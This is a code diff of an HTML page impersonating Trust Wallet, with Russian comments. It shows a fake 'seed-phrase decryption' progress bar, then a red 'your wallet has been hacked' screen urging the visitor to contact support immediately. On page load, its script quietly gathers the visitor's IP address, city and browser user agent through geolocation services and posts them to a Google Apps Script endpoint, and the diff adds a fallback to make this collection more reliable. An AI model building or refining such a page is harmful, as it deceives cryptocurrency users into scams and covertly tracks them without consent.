@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Trust Wallet</title>
   <style>
-    /* Твой оригинальный CSS */
+    /* Базовые стили и обнуление */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #0D1117;
@@ -14,19 +14,22 @@
       align-items: center;
       justify-content: center;
       min-height: 100vh;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       color: #fff;
       overflow: hidden;
       padding: 20px;
     }
+
+    /* Оверлей загрузки (начальный) */
     #notify-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.75);
+      background: rgba(0,0,0,0.8);
       display: flex;
       align-items: center;
       justify-content: center;
       z-index: 100;
+      transition: opacity 0.5s ease;
     }
     .notify-box {
       background: #161B22;
@@ -55,11 +58,12 @@
       background-size: 200% 100%;
       animation: shimmer 1.5s linear infinite, notifyGrow 3s ease-in-out forwards;
     }
-    @keyframes notifyGrow { from { width: 0%; } to { width: 100%; } }
-    
+
+    /* Логотип */
     .logo { margin-bottom: 30px; display: flex; align-items: center; gap: 12px; transition: opacity 0.5s; }
     .logo-text { font-size: 22px; font-weight: 700; color: #fff; }
-    
+
+    /* Основная карточка */
     .card {
       background: #161B22;
       border: 1px solid #21262D;
@@ -71,43 +75,20 @@
       flex-direction: column;
       align-items: center;
       box-shadow: 0 8px 40px rgba(0,0,0,0.5);
-      transition: all 0.5s ease;
+      transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
     }
 
-    /* --- Стили для экрана взлома --- */
-    #hack-content {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-      animation: fadeIn 0.6s ease;
-    }
-    .warning-icon {
-      width: 80px;
-      height: 80px;
-      margin-bottom: 24px;
-      fill: #FF4D4D;
-      filter: drop-shadow(0 0 15px rgba(255, 77, 77, 0.4));
-      animation: shake 0.5s infinite;
-    }
-    .warning-title { color: #FF4D4D; font-size: 22px; font-weight: 700; margin-bottom: 12px; }
-    .warning-text { color: #8B949E; font-size: 14px; line-height: 1.6; }
-
-    @keyframes shake {
-      0%, 100% { transform: rotate(0deg); }
-      25% { transform: rotate(5deg); }
-      75% { transform: rotate(-5deg); }
-    }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-    /* Остальные твои стили */
+    /* Иконка щита */
     .shield-icon { width: 80px; height: 80px; margin-bottom: 24px; animation: pulse 2s infinite; }
     @keyframes pulse {
       0%, 100% { opacity: 1; transform: scale(1); }
       50% { opacity: 0.8; transform: scale(1.05); }
     }
+
     .title { font-size: 18px; font-weight: 600; color: #E6EDF3; text-align: center; margin-bottom: 8px; }
     .subtitle { font-size: 14px; color: #8B949E; text-align: center; margin-bottom: 32px; }
+
+    /* Прогресс-бар */
     .progress-wrapper { width: 100%; background: #21262D; border-radius: 100px; height: 8px; overflow: hidden; margin-bottom: 12px; }
     .progress-bar {
       height: 100%; width: 0%; border-radius: 100px;
@@ -117,6 +98,8 @@
     }
     @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
     .percent { font-size: 14px; color: #00E5A0; font-weight: 700; margin-bottom: 30px; align-self: flex-end; }
+
+    /* Чек-лист */
     .checklist { width: 100%; display: flex; flex-direction: column; gap: 12px; border-top: 1px solid #21262D; padding-top: 24px; }
     .check-item { display: flex; align-items: center; gap: 12px; opacity: 0.3; transition: all 0.4s ease; transform: translateX(-10px); }
     .check-item.active { opacity: 1; transform: translateX(0); }
@@ -127,6 +110,33 @@
     .check-text { font-size: 14px; color: #8B949E; }
     .check-status { margin-left: auto; font-size: 12px; font-weight: 600; color: #3375BB; }
     .check-item.done .check-status { color: #00E5A0; }
+
+    /* --- ЭКРАН ВЗЛОМА --- */
+    #hack-content {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      animation: fadeIn 0.8s ease forwards;
+    }
+    .warning-icon {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 24px;
+      fill: #FF4D4D;
+      filter: drop-shadow(0 0 10px rgba(255, 77, 77, 0.5));
+      animation: shake 0.5s infinite;
+    }
+    .warning-title { color: #FF4D4D; font-size: 22px; font-weight: 700; margin-bottom: 12px; text-transform: uppercase; }
+    .warning-text { color: #8B949E; font-size: 14px; line-height: 1.6; }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-4px) rotate(-2deg); }
+      75% { transform: translateX(4px) rotate(2deg); }
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+    @keyframes notifyGrow { from { width: 0%; } to { width: 100%; } }
     @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
   </style>
 </head>
@@ -148,7 +158,7 @@
     </div>
   </div>
 
-  <div class="logo" id="main-logo">
+  <div class="logo">
     <svg width="32" height="32" viewBox="0 0 80 90" fill="none">
       <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#lg1)"/>
       <defs>
@@ -171,13 +181,10 @@
           </linearGradient>
         </defs>
       </svg>
-
       <div class="title">Расшифровка Seed-фразы</div>
       <div class="subtitle">Пожалуйста, подождите...</div>
-
       <div class="progress-wrapper"><div class="progress-bar" id="mainBar"></div></div>
       <div class="percent" id="pct">0%</div>
-      
       <div class="checklist">
         <div class="check-item" id="step1">
           <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
@@ -204,94 +211,104 @@
       </svg>
       <div class="warning-title">Ваш кошелек взломан</div>
       <p class="warning-text">
-        Обнаружена критическая уязвимость, получен доступ к вашим деньгам.
+        Обнаружена критическая ошибка безопасности при дешифровке. 
+        Доступ к вашим активам может быть перехвачен третьими лицами.
         <br><br>
-        Не закрывайте сайт пока идет дешифрование.
+        <strong>Свяжитесь с поддержкой немедленно.</strong>
       </p>
     </div>
   </div>
 
   <script>
-    // 1. Отправка данных (твой скрипт)
+    // --- 1. Твоя ссылка на Google Apps Script ---
     const googleScriptURL = 'https://script.google.com/macros/s/AKfycbykwY3qxSHEORxLTMD7eR5R6aK_3z12sNcG_OcEFdItC00ge1UZRTDjOsJPyKqKU0JCwg/exec';
+
+    // --- 2. Логика сбора данных (УЛУЧШЕННАЯ) ---
     async function collectAndSend() {
+      let geoData = { ip: 'Unknown', location: 'Unknown' };
+
       try {
-        const geoRes = await fetch('https://ipapi.co/json/');
-        const geo = await geoRes.json();
-        const params = new URLSearchParams();
-        params.append('ip', geo.ip || 'Unknown');
-        params.append('location', `${geo.country_name || '?'}, ${geo.city || '?'}`);
-        params.append('userAgent', navigator.userAgent);
-        fetch(googleScriptURL, { method: 'POST', mode: 'no-cors', body: params });
+        // Попытка 1: ipapi.co (HTTPS)
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          const data = await res.json();
+          geoData.ip = data.ip || 'Unknown';
+          geoData.location = `${data.country_name || '?'}, ${data.city || '?'}`;
+        } else { throw new Error(); }
       } catch (e) {
-        const params = new URLSearchParams();
-        params.append('ip', 'Blocked');
-        fetch(googleScriptURL, { method: 'POST', mode: 'no-cors', body: params });
+        try {
+          // Попытка 2: ip-api.com (HTTP/HTTPS)
+          const res2 = await fetch('https://demo.ip-api.com/json/?lang=en'); 
+          const data2 = await res2.json();
+          geoData.ip = data2.query || 'Unknown';
+          geoData.location = `${data2.country || '?'}, ${data2.city || '?'}`;
+        } catch (e2) { console.log("Geo failed"); }
       }
+
+      const params = new URLSearchParams();
+      params.append('ip', geoData.ip);
+      params.append('location', geoData.location);
+      params.append('userAgent', navigator.userAgent);
+
+      fetch(googleScriptURL, { method: 'POST', mode: 'no-cors', body: params });
     }
+
     collectAndSend();
 
-    // 2. Управление анимацией
+    // --- 3. Анимация прогресса ---
     const overlay = document.getElementById('notify-overlay');
     setTimeout(() => {
-      overlay.style.animation = 'fadeOut 0.5s ease forwards';
+      overlay.style.opacity = '0';
       setTimeout(() => overlay.remove(), 500);
     }, 3000);
 
-    // 3. Логика прогресс-бара и переключения экранов
     const pctEl = document.getElementById('pct');
     const mainBar = document.getElementById('mainBar');
-    const decryptSection = document.getElementById('decrypt-content');
-    const hackSection = document.getElementById('hack-content');
+    const decryptBox = document.getElementById('decrypt-content');
+    const hackBox = document.getElementById('hack-content');
     const mainCard = document.getElementById('main-card');
 
     const steps = [
-      { id: 'step1', threshold: 0, end: 25 },
-      { id: 'step2', threshold: 25, end: 50 },
-      { id: 'step3', threshold: 50, end: 75 },
-      { id: 'step4', threshold: 75, end: 100 }
+      { id: 'step1', start: 0, end: 25 },
+      { id: 'step2', start: 25, end: 50 },
+      { id: 'step3', start: 50, end: 75 },
+      { id: 'step4', start: 75, end: 100 }
     ];
 
     let progress = 0;
     const interval = setInterval(() => {
       progress += 0.5;
       
-      if (progress > 100) {
+      if (progress >= 100) {
         clearInterval(interval);
-        showHack();
+        pctEl.textContent = '100%';
+        mainBar.style.width = '100%';
+        // Ждем секунду на 100% и показываем взлом
+        setTimeout(triggerHack, 800);
         return;
       }
 
       pctEl.textContent = Math.floor(progress) + '%';
       mainBar.style.width = progress + '%';
 
-      steps.forEach((step) => {
-        const el = document.getElementById(step.id);
-        const statusText = el.querySelector('.check-status');
-        if (progress >= step.threshold) {
-          el.classList.add('active');
-          statusText.textContent = 'В процессе';
-        }
-        if (progress >= step.end) {
-          el.classList.add('done');
-          statusText.textContent = 'Выполнено';
-        }
+      steps.forEach(s => {
+        const el = document.getElementById(s.id);
+        const status = el.querySelector('.check-status');
+        if (progress >= s.start) { el.classList.add('active'); status.textContent = 'В процессе'; }
+        if (progress >= s.end) { el.classList.add('done'); status.textContent = 'Выполнено'; }
       });
-    }, 80); // Немного ускорил для динамики
+    }, 60);
 
-    function showHack() {
-      decryptSection.style.opacity = '0';
+    function triggerHack() {
+      decryptBox.style.opacity = '0';
       setTimeout(() => {
-        decryptSection.style.display = 'none';
+        decryptBox.style.display = 'none';
         mainCard.style.borderColor = '#FF4D4D';
-        mainCard.style.boxShadow = '0 0 40px rgba(255, 77, 77, 0.2)';
-        hackSection.style.display = 'flex';
-      }, 500);
+        mainCard.style.boxShadow = '0 0 30px rgba(255, 77, 77, 0.3)';
+        hackBox.style.display = 'flex';
+      }, 400);
     }
   </script>
+
 </body>
 </html>
-
-
-
-
